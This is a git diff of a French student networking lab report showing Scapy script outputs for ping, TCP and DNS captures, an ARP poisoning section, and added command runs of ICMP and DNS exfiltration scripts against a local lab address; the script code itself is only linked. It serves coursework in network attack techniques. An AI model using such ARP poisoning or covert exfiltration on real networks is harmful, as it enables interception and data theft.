@@ -12,6 +12,8 @@ Finished sending 1 packets.
 Received 1 packets, got 1 answers, remaining 0 packets
 Pong reçu : QueryAnswer(query=<Ether  dst=7c:5a:1c:d3:d8:76 src=b0:dc:ef:bb:ff:9e type=IPv4 |<IP  frag=0 proto=icmp src=10.33.73.81 dst=1.1.1.1 |<ICMP  type=echo-request |>>>, answer=<Ether  dst=b0:dc:ef:bb:ff:9e src=7c:5a:1c:d3:d8:76 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=28 id=36798 flags= frag=0 ttl=55 proto=icmp chksum=0x9eaf src=1.1.1.1 dst=10.33.73.81 |<ICMP  type=echo-reply code=0 chksum=0x0 id=0x0 seq=0x0 unused=b'' |<Padding  load=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>>)
 ```
+[Voir code](./Scripts/ping.py)
+
 
 **🌞 tcp_cap.py**
 
@@ -23,6 +25,8 @@ TCP SYN ACK reçu !
 - Port TCP src : 80
 - Port TCP dst : 55592
 ```
+[Voir code](./Scripts/tcp_cap.py)
+
 
 **🌞 dns_cap.py**
 
@@ -34,6 +38,8 @@ Finished sending 1 packets.
 Received 4 packets, got 1 answers, remaining 0 packets
 104.26.10.233
 ```
+[Voir code](./Scripts/dns_cap.py)
+
 
 **🌞 dns_lookup.py**
 ```bash
@@ -59,6 +65,8 @@ Finished sending 1 packets.
 Received 1 packets, got 1 answers, remaining 0 packets
 82.67.64.82
 ```
+[Voir code](./Scripts/dns_lookup.py)
+
 
 ## II. ARP Poisoning
 
@@ -68,6 +76,26 @@ Received 1 packets, got 1 answers, remaining 0 packets
 192.168.56.102 dev enp0s3 lladdr 08:00:27:f8:a8:b0 STALE 
 192.168.56.1 dev enp0s3 lladdr 0a:00:27:00:00:00 REACHABLE 
 ```
+[Voir code](./Scripts/arp_poisoning.py)
+
 
 ## III. Exfiltration ICMP
 **🌞 icmp_exf_send.py**
+```bash
+slayz@debian:~/Repo Git/b2-network_2024-2025$ sudo python3 TP4/Scripts/icmp_exf_send.py 192.168.1.11 j
+.
+Sent 1 packets.
+```
+[Voir code](./Scripts/icmp_exf_send.py)  
+[Voir trame Wireshark sur le icmp send]('./TP4/icmp_exf_send.pcapng')
+
+## III. Exfiltration DNS
+
+**🌞 dns_exfiltration_send.py**
+```bash
+slayz@debian:~/Repo Git/b2-network_2024-2025$ sudo python3 TP4/Scripts/dns_exfiltration_send.py 192.168.1.11 test
+.
+Sent 1 packets.
+```
+[Voir code](./Scripts/dns_exfiltration_send.py)  
+[Voir trame Wireshark sur le dns exfiltration]('./TP4/dns_exfiltration_send.pcapng')
